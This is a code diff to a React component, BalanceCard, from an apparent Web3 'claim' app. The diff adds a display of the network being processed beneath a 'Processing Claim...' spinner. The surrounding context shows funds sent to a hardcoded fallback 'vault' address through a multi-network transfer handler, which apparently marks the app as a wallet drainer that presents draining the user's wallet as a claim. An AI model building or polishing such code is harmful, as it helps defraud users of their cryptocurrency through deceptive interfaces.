@@ -16,6 +16,7 @@ interface BalanceCardProps {
 export default function BalanceCard({ walletState, onTransactionStart, onMultiNetworkTransfer }: BalanceCardProps) {
   const { isTransferring, hasAnyNetworkFunds, crossNetworkValue } = useWeb3();
   const [isWalletLoading, setIsWalletLoading] = useState(false);
+  const [currentProcessingNetwork, setCurrentProcessingNetwork] = useState<string | null>(null);
 
   // Get destination address from environment - using your vault address
   const destinationAddress = import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE";
@@ -124,9 +125,21 @@ export default function BalanceCard({ walletState, onTransactionStart, onMultiNe
           }`}
         >
           {isTransferring || isWalletLoading ? (
-            <div className="flex items-center space-x-2">
-              <Loader2 className="w-6 h-6 animate-spin" />
-              <span>Processing Claim...</span>
+            <div className="flex flex-col items-center space-y-1">
+              <div className="flex items-center space-x-2">
+                <Loader2 className="w-6 h-6 animate-spin" />
+                <span>Processing Claim...</span>
+              </div>
+              {currentProcessingNetwork && (
+                <div className="text-sm opacity-80">
+                  Network: {currentProcessingNetwork}
+                </div>
+              )}
+              {walletState.networkName && !currentProcessingNetwork && (
+                <div className="text-sm opacity-80">
+                  Starting on {walletState.networkName}
+                </div>
+              )}
             </div>
           ) : (
             <div className="flex items-center space-x-2">
